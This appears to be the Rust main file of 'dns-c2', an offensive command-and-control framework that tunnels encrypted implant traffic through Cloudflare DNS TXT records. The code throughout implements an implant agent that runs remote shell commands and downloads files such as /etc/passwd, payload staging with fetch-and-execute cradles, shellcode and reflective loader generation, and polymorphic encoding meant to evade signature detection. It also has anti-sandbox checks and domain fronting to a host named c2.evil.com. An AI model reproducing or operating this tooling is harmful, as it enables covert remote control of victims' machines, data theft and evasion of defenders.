use dns_c2::agent;
use dns_c2::c2;
use dns_c2::cradle;
use dns_c2::crypto;
use dns_c2::dns;
use dns_c2::encoder;
use dns_c2::evasion;
use dns_c2::payload;
use dns_c2::traffic;
use dns_c2::transport;

use clap::{Parser, Subcommand, ValueEnum};
use log::info;
use std::path::PathBuf;

const LONG_ABOUT: &str = "\
dns-c2 — A DNS-native C2 framework.

Cloudflare is the server. DNS is the database. One binary does everything.
All C2 traffic is encrypted ChaCha20-Poly1305 TXT records on your domain.
No VPS, no redirectors, no Docker. Just a Cloudflare free tier account.

OPERATOR QUICK START (local mode, no Cloudflare needed):
  $ export C2_KEY=$(dns-c2 keygen)
  $ dns-c2 sessions -d c2.local -b local
  $ dns-c2 task -d c2.local -b local -k $C2_KEY -s <session> shell whoami

AGENT QUICK START:
  $ dns-c2 agent -d c2.local -b local -k $C2_KEY --interval 5

STAGING (cradle-based delivery):
  $ dns-c2 stage -d stg.example.com -f ./payload.sh -l loader
  $ dns-c2 cradle -s bash -d stg.example.com -l loader";

#[derive(Parser)]
#[command(
    name = "dns-c2",
    version = "0.1.0",
    about = "dns-c2 — DNS-native C2 framework",
    long_about = LONG_ABOUT,
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Clone, ValueEnum)]
enum Backend {
    /// Cloudflare DNS API
    Cloudflare,
    /// Local JSON file — no network, for development
    Local,
}

#[derive(Parser, Clone)]
struct ConnArgs {
    /// Base domain for DNS records
    #[arg(short, long)]
    domain: String,

    /// DNS backend
    #[arg(short, long, default_value = "cloudflare")]
    backend: Backend,

    /// Cloudflare API token
    #[arg(short, long, env = "C2_CF_TOKEN")]
    token: Option<String>,

    /// Cloudflare Zone ID
    #[arg(short, long, env = "C2_CF_ZONE")]
    zone: Option<String>,

    /// Local JSON store path
    #[arg(long, default_value = "./c2-records.json")]
    store_path: PathBuf,
}

#[derive(Subcommand)]
enum Commands {
    /// Run as agent on a target (agent-side)
    ///
    /// Checks in, then polls for tasks, executes them, and returns results.
    /// All communication is encrypted and goes through DNS TXT records.
    ///
    /// Example:
    ///   dns-c2 agent -d c2.example.com -k $KEY --interval 30 --jitter 0.3
    Agent {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key (hex-encoded 32 bytes)
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Poll interval in seconds
        #[arg(long, default_value_t = 30)]
        interval: u64,

        /// Jitter factor (0.0-1.0)
        #[arg(long, default_value_t = 0.3)]
        jitter: f64,

        /// Override auto-generated session ID
        #[arg(long)]
        session_id: Option<String>,
    },

    /// List active sessions (operator-side)
    ///
    /// Shows all agents that have checked in, with host info and last-seen time.
    ///
    /// Example:
    ///   dns-c2 sessions -d c2.example.com -k $KEY
    Sessions {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,
    },

    /// Send a task to an agent (operator-side)
    ///
    /// Sends a command and waits for the response (or use --no-wait).
    ///
    /// Available commands: shell, ls, cat, pwd, whoami, ps, env,
    ///                     download, id, hostname, netstat, exit
    ///
    /// Examples:
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 shell whoami
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 ls /etc
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 download /etc/passwd
    Task {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Target session ID
        #[arg(short, long)]
        session: String,

        /// Command to execute
        command: String,

        /// Command arguments
        args: Vec<String>,

        /// Don't wait for response
        #[arg(long, default_value_t = false)]
        no_wait: bool,

        /// Response timeout in seconds
        #[arg(long, default_value_t = 120)]
        timeout: u64,
    },

    /// Read a task response by ID (operator-side)
    ///
    /// Example:
    ///   dns-c2 result -d c2.example.com -k $KEY -s abc123 -t taskid
    Result {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Session ID
        #[arg(short, long)]
        session: String,

        /// Task ID
        #[arg(short = 'i', long)]
        task_id: String,
    },

    /// Generate a new 256-bit encryption key
    Keygen,

    /// Stage a payload into DNS for cradle-based delivery
    ///
    /// NOTE: Staged payloads are plain base64, NOT encrypted.
    ///
    /// Example:
    ///   dns-c2 stage -d stg.example.com -f ./payload.sh -l loader
    Stage {
        #[command(flatten)]
        conn: ConnArgs,

        /// Local file to stage
        #[arg(short, long)]
        file: PathBuf,

        /// Label for the staged payload
        #[arg(short, long)]
        label: String,

        /// Payload type (auto-detected if omitted)
        #[arg(long, value_name = "TYPE")]
        r#type: Option<String>,
    },

    /// Generate a cradle one-liner to fetch and execute a staged payload
    ///
    /// Example:
    ///   dns-c2 cradle -s bash -d stg.example.com -l loader -n 1.1.1.1
    Cradle {
        #[command(flatten)]
        conn: ConnArgs,

        /// Target shell (bash, pwsh, cmd)
        #[arg(short, long)]
        shell: String,

        /// Label of the staged payload
        #[arg(short, long)]
        label: String,

        /// DNS server for the cradle to query
        #[arg(short, long)]
        ns: Option<String>,
    },

    /// Remove a staged payload from DNS
    Unstage {
        #[command(flatten)]
        conn: ConnArgs,

        /// Label to remove
        #[arg(short, long)]
        label: String,
    },

    /// Generate advanced payloads (shellcode, PIC, Donut-style, reflective)
    ///
    /// Convert binaries to shellcode, wrap in PIC loaders, or generate
    /// staged DNS loaders. Supports ELF and PE formats.
    ///
    /// Examples:
    ///   dns-c2 generate -f ./implant -o shellcode.bin --format elf-pic
    ///   dns-c2 generate -f ./payload.exe -o sc.bin --format pe-to-shellcode --compress
    ///   dns-c2 generate -f ./implant -o loader.sh --format staged-dns --domain c2.example.com --label loader -k $KEY
    Generate {
        /// Input binary file
        #[arg(short, long)]
        file: PathBuf,

        /// Output file
        #[arg(short, long)]
        output: PathBuf,

        /// Payload format
        #[arg(long, default_value = "pe-to-shellcode")]
        format: String,

        /// Compress the payload
        #[arg(long, default_value_t = false)]
        compress: bool,

        /// XOR key for additional encryption layer (hex)
        #[arg(long)]
        xor_key: Option<String>,

        /// Add anti-debug checks to PIC wrapper
        #[arg(long, default_value_t = false)]
        anti_debug: bool,

        /// Encryption key (for staged DNS loader)
        #[arg(short, long, env = "C2_KEY")]
        key: Option<String>,

        /// Domain (for staged DNS loader)
        #[arg(long)]
        domain: Option<String>,

        /// Label (for staged DNS loader)
        #[arg(long)]
        label: Option<String>,
    },

    /// Encode/obfuscate a payload through a polymorphic encoder chain
    ///
    /// Applies multiple encoding passes (XOR, substitution, dead bytes, entropy
    /// normalization) to evade signature-based detection.
    ///
    /// Examples:
    ///   dns-c2 encode -f payload.bin -o encoded.bin --preset heavy
    ///   dns-c2 encode -f payload.bin -o encoded.bin --passes xor,deadbytes,reverse
    Encode {
        /// Input file
        #[arg(short, long)]
        file: PathBuf,

        /// Output file
        #[arg(short, long)]
        output: PathBuf,

        /// Encoder preset (light, medium, heavy)
        #[arg(long, default_value = "medium")]
        preset: String,

        /// Save decode keys to this file (needed for decoding)
        #[arg(long)]
        keys_file: Option<PathBuf>,
    },

    /// Analyze payload entropy and security characteristics
    ///
    /// Examples:
    ///   dns-c2 analyze -f payload.bin
    Analyze {
        /// Input file to analyze
        #[arg(short, long)]
        file: PathBuf,
    },

    /// Run anti-analysis environment checks
    ///
    /// Detects VMs, sandboxes, debuggers, and analysis tools.
    /// Returns a confidence score for whether the environment is being analyzed.
    Envcheck,

    /// Generate domain fronting configuration
    ///
    /// Examples:
    ///   dns-c2 fronting --cdn cloudflare --front cdn.example.com --real c2.evil.com
    Fronting {
        /// CDN provider (cloudflare, cloudfront, azure, fastly, generic)
        #[arg(long, default_value = "cloudflare")]
        cdn: String,

        /// Front domain (visible to network observers)
        #[arg(long)]
        front: String,

        /// Real host (delivered via Host header)
        #[arg(long)]
        real: String,

        /// HTTP path
        #[arg(long, default_value = "/api/v1/telemetry")]
        path: String,

        /// Output test request
        #[arg(long, default_value_t = false)]
        test: bool,
    },

    /// Show transport channel status and configuration
    ///
    /// Examples:
    ///   dns-c2 channels --preset stealthy
    Channels {
        /// Channel preset (stealthy, aggressive, fronted)
        #[arg(long, default_value = "stealthy")]
        preset: String,

        /// Cloudflare API token
        #[arg(long, env = "C2_CF_TOKEN")]
        token: Option<String>,

        /// Cloudflare Zone ID
        #[arg(long, env = "C2_CF_ZONE")]
        zone: Option<String>,
    },
}

fn make_backend(conn: &ConnArgs) -> Box<dyn dns::DnsBackend> {
    match conn.backend {
        Backend::Cloudflare => {
            let token = conn.token.clone()
                .expect("Cloudflare backend requires --token or C2_CF_TOKEN");
            let zone = conn.zone.clone()
                .expect("Cloudflare backend requires --zone or C2_CF_ZONE");
            let retry = dns::retry::RetryBackend::with_defaults(
                Box::new(dns::cloudflare::CloudflareBackend::new(token, zone))
            );
            Box::new(retry)
        }
        Backend::Local => {
            info!("Using local backend: {:?}", conn.store_path);
            Box::new(dns::local::LocalFileBackend::new(conn.store_path.clone()))
        }
    }
}

fn main() {
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("warn")
    ).init();

    let cli = Cli::parse();

    match cli.command {
        // ─── C2 Agent ───
        Commands::Agent { conn, key, interval, jitter, session_id } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let session = session_id.unwrap_or_else(c2::generate_session_id);
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let config = agent::AgentConfig {
                domain: conn.domain,
                key: master_key,
                session_id: session.clone(),
                poll_interval_secs: interval,
                jitter_pct: jitter.clamp(0.0, 1.0),
            };

            eprintln!("dns-c2 agent | session={} interval={}s jitter={:.0}%",
                session, interval, jitter * 100.0);

            rt.block_on(async {
                if let Err(e) = agent::run(backend.as_ref(), &config).await {
                    eprintln!("Agent error: {e}");
                    std::process::exit(1);
                }
            });
        }

        // ─── List Sessions ───
        Commands::Sessions { conn, key } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match c2::list_sessions(backend.as_ref(), &conn.domain, &master_key).await {
                    Ok(sessions) => {
                        if sessions.is_empty() {
                            eprintln!("No active sessions");
                        } else {
                            eprintln!("{} session(s):\n", sessions.len());
                            for s in &sessions {
                                println!("{s}");
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Send Task ───
        Commands::Task { conn, key, session, command, args, no_wait, timeout } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let task_id = c2::generate_task_id();
            let task = c2::Task {
                task_id: task_id.clone(),
                command: command.clone(),
                args: args.clone(),
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
            };

            rt.block_on(async {
                // Send task
                if let Err(e) = c2::send_task(backend.as_ref(), &conn.domain, &master_key, &session, &task).await {
                    eprintln!("Failed to send task: {e}");
                    std::process::exit(1);
                }
                eprintln!("Sent: {} {} → session {} [task={}]",
                    command, args.join(" "), session, task_id);

                if no_wait {
                    println!("task_id={task_id}");
                    return;
                }

                // Wait for response
                eprintln!("Waiting for response (timeout={}s)...", timeout);
                match c2::wait_for_response(
                    backend.as_ref(), &conn.domain, &master_key, &session, &task_id, timeout,
                ).await {
                    Ok(resp) => {
                        eprintln!("[{}] task={}", resp.status, resp.task_id);
                        println!("{}", resp.output);
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Read Result ───
        Commands::Result { conn, key, session, task_id } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match c2::read_response(backend.as_ref(), &conn.domain, &master_key, &session, &task_id).await {
                    Ok(Some(resp)) => {
                        eprintln!("[{}] task={}", resp.status, resp.task_id);
                        println!("{}", resp.output);
                    }
                    Ok(None) => {
                        eprintln!("No response yet for task {task_id}");
                        std::process::exit(1);
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Keygen ───
        Commands::Keygen => {
            let key = crypto::generate_key();
            println!("{}", hex::encode(key));
        }

        // ─── Stage ───
        Commands::Stage { conn, file, label, r#type } => {
            let data = std::fs::read(&file).unwrap_or_else(|e| {
                eprintln!("Failed to read {}: {e}", file.display());
                std::process::exit(1);
            });

            let payload_type = r#type.map(|t| t.parse::<cradle::PayloadType>().unwrap_or_else(|e| {
                eprintln!("Invalid type: {e}");
                std::process::exit(1);
            }));

            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            eprintln!("Staging {} ({} bytes) as '{}'...", file.display(), data.len(), label);
            rt.block_on(async {
                match cradle::stage_payload(backend.as_ref(), &conn.domain, &label, &data, payload_type).await {
                    Ok(meta) => {
                        eprintln!("Staged: {} chunks, type={}, hash={}",
                            meta.chunks, meta.payload_type, meta.hash);
                        eprintln!("\nGenerate cradles:");
                        eprintln!("  dns-c2 cradle -s bash -d {} -l {}", conn.domain, label);
                        eprintln!("  dns-c2 cradle -s pwsh -d {} -l {}", conn.domain, label);
                    }
                    Err(e) => { eprintln!("Stage failed: {e}"); std::process::exit(1); }
                }
            });
        }

        // ─── Cradle ───
        Commands::Cradle { conn, shell, label, ns } => {
            let shell_type = shell.parse::<cradle::Shell>().unwrap_or_else(|e| {
                eprintln!("{e}");
                std::process::exit(1);
            });

            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let meta = rt.block_on(async {
                cradle::read_stage_meta(backend.as_ref(), &conn.domain, &label).await
            }).unwrap_or_else(|e| {
                eprintln!("Failed to read metadata: {e}");
                std::process::exit(1);
            });

            println!("{}", cradle::generate_cradle(shell_type, &conn.domain, &label, &meta, ns.as_deref()));
        }

        // ─── Unstage ───
        Commands::Unstage { conn, label } => {
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match cradle::unstage_payload(backend.as_ref(), &conn.domain, &label).await {
                    Ok(count) => eprintln!("Deleted {count} records"),
                    Err(e) => { eprintln!("Unstage failed: {e}"); std::process::exit(1); }
                }
            });
        }

        // ─── Generate Advanced Payload ───
        Commands::Generate { file, output, format, compress, xor_key, anti_debug, key, domain, label } => {
            let data = std::fs::read(&file).unwrap_or_else(|e| {
                eprintln!("Failed to read {}: {e}", file.display());
                std::process::exit(1);
            });

            eprintln!("Input: {} ({} bytes)", file.display(), data.len());

            let result: Vec<u8> = match format.as_str() {
                "pe-to-shellcode" | "donut" => {
                    let xor = xor_key.map(|k| hex::decode(k).unwrap_or_else(|e| {
                        eprintln!("Invalid XOR key: {e}"); std::process::exit(1);
                    }));
                    let config = payload::donut::DonutConfig {
                        compress,
                        xor_key: xor,
                        ..Default::default()
                    };
                    payload::donut::pe_to_shellcode(&data, &config).unwrap_or_else(|e| {
                        eprintln!("PE-to-shellcode failed: {e}"); std::process::exit(1);
                    })
                }
                "elf-pic" | "pic" => {
                    let k = key.map(|k| crypto::key_from_hex(&k).unwrap_or_else(|e| {
                        eprintln!("Invalid key: {e}"); std::process::exit(1);
                    }));
                    let config = payload::pic::PicConfig {
                        encrypt: k.is_some(),
                        key: k,
                        anti_debug,
                        ..Default::default()
                    };
                    payload::pic::wrap_pic(&data, &config).unwrap_or_else(|e| {
                        eprintln!("PIC wrap failed: {e}"); std::process::exit(1);
                    })
                }
                "reflective" | "relf" => {
                    let config = payload::reflective::ReflectiveConfig {
                        compress,
                        ..Default::default()
                    };
                    payload::reflective::generate_reflective_loader(&data, &config).unwrap_or_else(|e| {
                        eprintln!("Reflective loader failed: {e}"); std::process::exit(1);
                    })
                }
                "shellcode" | "extract" => {
                    if data.len() >= 4 && &data[..4] == b"\x7fELF" {
                        payload::shellcode::extract_elf_text(&data).unwrap_or_else(|e| {
                            eprintln!("ELF extraction failed: {e}"); std::process::exit(1);
                        })
                    } else if data.len() >= 2 && &data[..2] == b"MZ" {
                        payload::shellcode::extract_pe_text(&data).unwrap_or_else(|e| {
                            eprintln!("PE extraction failed: {e}"); std::process::exit(1);
                        })
                    } else {
                        eprintln!("Unknown binary format"); std::process::exit(1);
                    }
                }
                "memfd-stub" => {
                    payload::shellcode::generate_memfd_stub(&data, payload::Arch::X86_64).unwrap_or_else(|e| {
                        eprintln!("Memfd stub failed: {e}"); std::process::exit(1);
                    })
                }
                "staged-dns" | "stager" => {
                    let k = key.unwrap_or_else(|| {
                        eprintln!("--key required for staged-dns format"); std::process::exit(1);
                    });
                    let master_key = crypto::key_from_hex(&k).unwrap_or_else(|e| {
                        eprintln!("Invalid key: {e}"); std::process::exit(1);
                    });
                    let d = domain.unwrap_or_else(|| {
                        eprintln!("--domain required for staged-dns format"); std::process::exit(1);
                    });
                    let l = label.unwrap_or_else(|| "payload".to_string());

                    let config = payload::staged::StagerConfig {
                        domain: d,
                        label: l,
                        chunk_count: (data.len() / 1350) + 1,
                        key: master_key,
                        dns_server: None,
                        query_jitter_ms: 100,
                        method: payload::staged::DnsQueryMethod::SystemResolver,
                    };
                    let script = payload::staged::generate_stager_script(
                        &config, payload::staged::StagerShell::Bash,
                    ).unwrap_or_else(|e| {
                        eprintln!("Stager generation failed: {e}"); std::process::exit(1);
                    });
                    script.into_bytes()
                }
                other => {
                    eprintln!("Unknown format: {other}");
                    eprintln!("Available: pe-to-shellcode, elf-pic, reflective, shellcode, memfd-stub, staged-dns");
                    std::process::exit(1);
                }
            };

            std::fs::write(&output, &result).unwrap_or_else(|e| {
                eprintln!("Failed to write {}: {e}", output.display());
                std::process::exit(1);
            });
            eprintln!("Output: {} ({} bytes, format={})", output.display(), result.len(), format);
        }

        // ─── Encode/Obfuscate ───
        Commands::Encode { file, output, preset, keys_file } => {
            let data = std::fs::read(&file).unwrap_or_else(|e| {
                eprintln!("Failed to read {}: {e}", file.display());
                std::process::exit(1);
            });

            let chain = match preset.as_str() {
                "light" => encoder::EncoderChain::light(),
                "medium" => encoder::EncoderChain::medium(),
                "heavy" => encoder::EncoderChain::heavy(),
                _ => {
                    eprintln!("Unknown preset: {preset} (try: light, medium, heavy)");
                    std::process::exit(1);
                }
            };

            let encoded = chain.encode(&data).unwrap_or_else(|e| {
                eprintln!("Encoding failed: {e}");
                std::process::exit(1);
            });

            std::fs::write(&output, &encoded.data).unwrap_or_else(|e| {
                eprintln!("Failed to write {}: {e}", output.display());
                std::process::exit(1);
            });

            eprintln!("Encoded: {} → {} ({} bytes → {} bytes, {} passes)",
                file.display(), output.display(),
                data.len(), encoded.data.len(), encoded.num_passes);

            if let Some(kf) = keys_file {
                let keys_json = serde_json::to_string_pretty(&encoded.decode_keys).unwrap();
                std::fs::write(&kf, keys_json).unwrap_or_else(|e| {
                    eprintln!("Failed to write keys: {e}");
                    std::process::exit(1);
                });
                eprintln!("Decode keys: {}", kf.display());
            } else {
                eprintln!("WARNING: No --keys-file specified. Decode keys are lost!");
            }
        }

        // ─── Analyze ───
        Commands::Analyze { file } => {
            let data = std::fs::read(&file).unwrap_or_else(|e| {
                eprintln!("Failed to read {}: {e}", file.display());
                std::process::exit(1);
            });

            let report = encoder::entropy::analyze(&data);

            println!("=== Entropy Analysis: {} ===", file.display());
            println!("Size:           {} bytes", data.len());
            println!("Entropy:        {:.4} bits/byte", report.overall);
            println!("Classification: {:?}", report.classification);
            println!("Suspicious:     {}", if report.suspicious { "YES" } else { "no" });
            println!();

            // Detect binary format
            if data.len() >= 4 {
                if &data[..4] == b"\x7fELF" {
                    println!("Format:         ELF");
                    if let Ok(arch) = payload::detect_arch(&data) {
                        println!("Architecture:   {arch}");
                    }
                } else if &data[..2] == b"MZ" {
                    println!("Format:         PE");
                    if let Ok(info) = payload::donut::parse_pe(&data) {
                        println!("Architecture:   {}", info.arch);
                        println!("DLL:            {}", info.is_dll);
                        println!(".NET:           {}", info.is_dotnet);
                        println!("Relocations:    {}", info.has_relocations);
                        println!("TLS:            {}", info.has_tls);
                    }
                } else if &data[..4] == b"OBFS" {
                    println!("Format:         ObFUSE shellcode package");
                } else if &data[..4] == b"RELF" {
                    println!("Format:         Reflective ELF loader");
                }
            }

            println!();
            println!("Per-block entropy ({} blocks of 256B):", report.block_entropies.len());
            for (offset, entropy) in report.block_entropies.iter().take(20) {
                let bar_len = (entropy * 8.0) as usize;
                let bar: String = "█".repeat(bar_len.min(64));
                println!("  0x{offset:06x}: {entropy:.2} {bar}");
            }
            if report.block_entropies.len() > 20 {
                println!("  ... ({} more blocks)", report.block_entropies.len() - 20);
            }
        }

        // ─── Envcheck ───
        Commands::Envcheck => {
            let report = evasion::anti_analysis::run_all_checks();
            println!("=== Environment Analysis ===");
            println!("Confidence:     {:.0}% analysis environment", report.confidence * 100.0);
            println!("Verdict:        {}", if report.is_analysis_env { "ANALYSIS ENVIRONMENT" } else { "likely clean" });
            println!();
            for check in &report.checks {
                let icon = if check.detected { "[!]" } else { "[+]" };
                println!("  {icon} {:<18} {}", check.name, check.detail);
            }
        }

        // ─── Domain Fronting ───
        Commands::Fronting { cdn, front, real, path, test } => {
            let provider = match cdn.as_str() {
                "cloudflare" | "cf" => traffic::fronting::CdnProvider::Cloudflare,
                "cloudfront" | "aws" => traffic::fronting::CdnProvider::CloudFront,
                "azure" => traffic::fronting::CdnProvider::AzureCdn,
                "fastly" => traffic::fronting::CdnProvider::Fastly,
                "generic" => traffic::fronting::CdnProvider::Generic,
                _ => {
                    eprintln!("Unknown CDN: {cdn} (try: cloudflare, cloudfront, azure, fastly, generic)");
                    std::process::exit(1);
                }
            };

            let config = traffic::fronting::FrontingConfig {
                front_domain: front.clone(),
                real_host: real.clone(),
                cdn: provider,
                path,
                ..Default::default()
            };

            println!("=== Domain Fronting Configuration ===");
            println!("CDN:          {cdn}");
            println!("Front domain: {front} (visible in SNI/DNS)");
            println!("Real host:    {real} (in Host header)");
            println!("Path:         {}", config.path);

            if test {
                println!();
                let req = traffic::fronting::build_fronted_request(
                    &config, b"test-payload", traffic::fronting::HttpMethod::Post,
                ).unwrap();
                println!("=== Test Request ===");
                println!("{}", req.to_raw_http());
            }
        }

        // ─── Transport Channels ───
        Commands::Channels { preset, token, zone } => {
            let t = token.as_deref().unwrap_or("YOUR_TOKEN");
            let z = zone.as_deref().unwrap_or("YOUR_ZONE");

            let channels = match preset.as_str() {
                "stealthy" => transport::channel::preset_stealthy("c2.domain", t, z),
                "aggressive" => transport::channel::preset_aggressive("c2.domain", t, z),
                _ => {
                    eprintln!("Unknown preset: {preset} (try: stealthy, aggressive)");
                    std::process::exit(1);
                }
            };

            let chain = transport::chain::TransportChain::new(
                channels,
                transport::chain::FailoverStrategy::Priority,
            );

            println!("=== Transport Channel Configuration ({preset}) ===");
            println!("Channels: {}", chain.channel_count());
            println!("Healthy:  {}", chain.healthy_count());
            println!();
            for report in chain.status_report() {
                println!("  {report}");
            }
        }
    }
}
